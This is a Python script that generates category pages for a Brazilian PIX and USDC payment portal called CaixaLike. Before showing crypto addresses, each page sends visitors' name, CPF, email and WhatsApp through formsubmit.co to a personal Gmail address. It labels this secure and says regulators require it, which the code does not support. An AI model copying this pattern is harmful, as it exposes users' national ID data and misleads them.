#!/usr/bin/env python3
"""
CaixaLike — Gerador de Páginas de Categoria
Executa uma vez para criar todos os index.html das 10 categorias.
"""

import os

CATEGORIES = [
    {
        "slug":     "alimentacao",
        "emoji":    "🍽️",
        "title":    "Alimentação",
        "subtitle": "Restaurantes, lanchonetes e delivery"
    },
    {
        "slug":     "saude",
        "emoji":    "🏥",
        "title":    "Saúde",
        "subtitle": "Clínicas, farmácias e bem-estar"
    },
    {
        "slug":     "mercado",
        "emoji":    "🛒",
        "title":    "Mercado",
        "subtitle": "Supermercados e lojas de bairro"
    },
    {
        "slug":     "pet",
        "emoji":    "🐾",
        "title":    "Pet",
        "subtitle": "Pet shops, veterinários e acessórios"
    },
    {
        "slug":     "financeiro",
        "emoji":    "💼",
        "title":    "Financeiro",
        "subtitle": "Serviços financeiros e consultorias"
    },
    {
        "slug":     "negocios",
        "emoji":    "📊",
        "title":    "Negócios",
        "subtitle": "Empresas e soluções corporativas"
    },
    {
        "slug":     "ofertas",
        "emoji":    "🏷️",
        "title":    "Ofertas",
        "subtitle": "Promoções e descontos exclusivos"
    },
    {
        "slug":     "profissionais",
        "emoji":    "👤",
        "title":    "Profissionais",
        "subtitle": "Prestadores de serviço e freelancers"
    },
    {
        "slug":     "servicos",
        "emoji":    "🔧",
        "title":    "Serviços",
        "subtitle": "Manutenção, instalação e reparos"
    },
    {
        "slug":     "carros",
        "emoji":    "🚗",
        "title":    "Carros",
        "subtitle": "Oficinas, peças e serviços automotivos"
    },
]

TEMPLATE = """\
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="{title} — CaixaLike. {subtitle}. Pague via PIX ou Criptomoeda.">
  <meta name="theme-color" content="#0A0A0A">
  <title>{title} — CaixaLike</title>
  <link rel="stylesheet" href="../css/style.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js" defer></script>
</head>
<body>

<header class="site-header">
  <div class="logo-mark">CaixaLike</div>
  <h1>{emoji} {title}</h1>
  <p>{subtitle}</p>
</header>

<div class="container">
  <a href="../" class="back-link">← Voltar ao Portal</a>

  <!-- ① MÓDULO DE VALOR PIX -->
  <div class="valor-module">
    <label for="valorPix">Qual valor deseja pagar?</label>
    <input
      type="text"
      id="valorPix"
      placeholder="0,00"
      inputmode="decimal"
      maxlength="12"
      autocomplete="off"
    >
    <p class="hint">Digite o valor — o QR Code é gerado automaticamente</p>
  </div>

  <!-- ② ÁREA PIX DINÂMICO (visível após digitar valor) -->
  <div id="pixArea" class="payment-panel" style="display:none;">
    <div class="panel-title">
      📱 Pagamento via PIX
      <span class="panel-badge">Instantâneo</span>
    </div>
    <p class="amount-display" id="valorDisplay"></p>

    <div class="pay-cols">
      <!-- QR Code -->
      <div class="pay-block" style="text-align:center;">
        <h4>QR Code</h4>
        <div id="qrcode-pix" class="qr-wrap"></div>
        <p style="font-size:13px;color:#888;margin-top:10px;">Abra o app do banco e escaneie</p>
      </div>

      <!-- Copia e Cola -->
      <div class="pay-block">
        <h4>PIX Copia e Cola</h4>
        <p style="font-size:13px;color:#666;margin-bottom:12px;">
          Copie o código abaixo e cole no seu app bancário em "Pagar com PIX".
        </p>
        <div class="copy-row">
          <input type="text" id="pixCodigo" readonly placeholder="Código PIX aparece aqui...">
          <button class="btn-copy" id="btnCopy" onclick="copiarPix()">Copiar</button>
        </div>
        <p class="confirm-msg" id="confirmacao"></p>
      </div>
    </div>
  </div>

  <!-- ③ ÁREA CRIPTOMOEDAS -->
  <div class="payment-panel">
    <div class="panel-title">
      🪙 Pagamento em Criptomoedas
      <span class="panel-badge crypto">USDC</span>
    </div>

    <!-- PASSO 1: FORMULÁRIO DE IDENTIFICAÇÃO (visível por padrão) -->
    <div id="kyc-form-area">
      <div style="background:#f8f9fa;border:1px solid #e0e0d8;border-radius:10px;padding:24px;margin-bottom:8px;">
        <p style="font-size:15px;font-weight:800;color:#111;margin-bottom:4px;">🔐 Identificação obrigatória</p>
        <p style="font-size:13px;color:#666;margin-bottom:20px;">
          Para sua segurança e rastreabilidade da operação, preencha seus dados antes de visualizar os endereços de pagamento.
          Você receberá uma confirmação no seu e-mail.
        </p>

        <form id="kyc-form"
          action="https://formsubmit.co/aquileslabor@gmail.com"
          method="POST"
          onsubmit="handleKycSubmit(event)">

          <input type="hidden" name="_subject"  value="🪙 Identificação Cripto — CaixaLike">
          <input type="hidden" name="_template" value="table">
          <input type="hidden" name="_captcha"  value="false">

          <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px;">
            <div>
              <label style="display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;color:#888;margin-bottom:6px;">Nome completo *</label>
              <input type="text" name="nome" required placeholder="Seu nome completo"
                style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:14px;outline:none;transition:border-color .2s;"
                onfocus="this.style.borderColor='#E63946'" onblur="this.style.borderColor='#ddd'">
            </div>
            <div>
              <label style="display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;color:#888;margin-bottom:6px;">CPF *</label>
              <input type="text" name="cpf" id="cpf-input" required placeholder="000.000.000-00" maxlength="14" inputmode="numeric"
                style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:monospace;transition:border-color .2s;"
                onfocus="this.style.borderColor='#E63946'" onblur="this.style.borderColor='#ddd'">
            </div>
          </div>

          <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:20px;">
            <div>
              <label style="display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;color:#888;margin-bottom:6px;">E-mail *</label>
              <input type="email" name="email" required placeholder="seu@email.com"
                style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:14px;outline:none;transition:border-color .2s;"
                onfocus="this.style.borderColor='#E63946'" onblur="this.style.borderColor='#ddd'">
            </div>
            <div>
              <label style="display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.08em;color:#888;margin-bottom:6px;">WhatsApp</label>
              <input type="tel" name="whatsapp" id="wpp-kyc" placeholder="(47) 9 9999-9999"
                style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:14px;outline:none;transition:border-color .2s;"
                onfocus="this.style.borderColor='#E63946'" onblur="this.style.borderColor='#ddd'">
            </div>
          </div>

          <button type="submit" id="kyc-btn"
            style="width:100%;padding:14px;background:#E63946;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:800;cursor:pointer;transition:background .15s;display:flex;align-items:center;justify-content:center;gap:8px;">
            🔓 Identificar e ver endereços de pagamento
          </button>

          <p style="font-size:12px;color:#999;text-align:center;margin-top:12px;line-height:1.5;">
            🔒 Seus dados são enviados de forma segura e usados apenas para rastreabilidade da sua transação.<br>
            Exigência regulatória: Receita Federal / Banco Central do Brasil.
          </p>
        </form>
      </div>
    </div>

    <!-- PASSO 2: QR CODES (ocultos até identificação) -->
    <div id="kyc-success-area" style="display:none;">

      <div style="background:#f0fff4;border:1px solid #b0e8c0;border-radius:8px;padding:14px 18px;margin-bottom:20px;display:flex;align-items:center;gap:10px;">
        <span style="font-size:20px;">✅</span>
        <div>
          <p style="font-size:14px;font-weight:700;color:#1a6a2a;margin-bottom:2px;">Identificação confirmada!</p>
          <p style="font-size:12px;color:#2a8a3a;">Você receberá um e-mail de confirmação. Agora escolha a rede para pagar.</p>
        </div>
      </div>

      <div class="pay-cols">

        <!-- Polygon -->
        <div class="pay-block">
          <h4>Polygon Network (MATIC)</h4>
          <p style="font-size:13px;color:#666;margin-bottom:8px;">
            <strong>Ativo aceito:</strong> USDC (ERC-20 / Polygon)
          </p>
          <p style="font-size:13px;color:#666;margin-bottom:4px;font-weight:600;">Endereço:</p>
          <div class="crypto-address" id="endereco-polygon">Carregando…</div>
          <div class="qr-wrap">
            <img src="../img/qr-polygon.jpg" alt="QR Code Polygon USDC" style="width:180px;height:180px;border-radius:8px;">
          </div>
          <div class="risk-note">
            ⚠️ Envie APENAS USDC na rede Polygon.<br>Outros ativos ou redes resultam em perda irreversível.
          </div>
        </div>

        <!-- Solana -->
        <div class="pay-block">
          <h4>Solana Network (SOL)</h4>
          <p style="font-size:13px;color:#666;margin-bottom:8px;">
            <strong>Ativo aceito:</strong> USDC (SPL / Solana)
          </p>
          <p style="font-size:13px;color:#666;margin-bottom:4px;font-weight:600;">Endereço:</p>
          <div class="crypto-address" id="endereco-solana">Carregando…</div>
          <div class="qr-wrap">
            <img src="../img/qr-solana.jpg" alt="QR Code Solana USDC" style="width:180px;height:180px;border-radius:8px;">
          </div>
          <div class="risk-note">
            ⚠️ Envie APENAS USDC na rede Solana.<br>Outros ativos ou redes resultam em perda irreversível.
          </div>
        </div>

      </div>
    </div>
  </div>

</div>

<footer class="site-footer">
  CaixaLike © 2026 — Portal de Direcionamento Inteligente<br>
  Parcerias: <a href="https://wa.me/5547984459259" target="_blank" rel="noopener">(47) 98445‑9259</a>
</footer>

<script src="../js/pagamentos.js"></script>

</body>
</html>
"""

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

created = []
for cat in CATEGORIES:
    folder = os.path.join(BASE_DIR, cat["slug"])
    os.makedirs(folder, exist_ok=True)
    path = os.path.join(folder, "index.html")
    content = TEMPLATE.format(**cat)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    created.append(path)
    print(f"  ✅  {cat['slug']}/index.html")

print(f"\n🎉  {len(created)} páginas geradas com sucesso!")
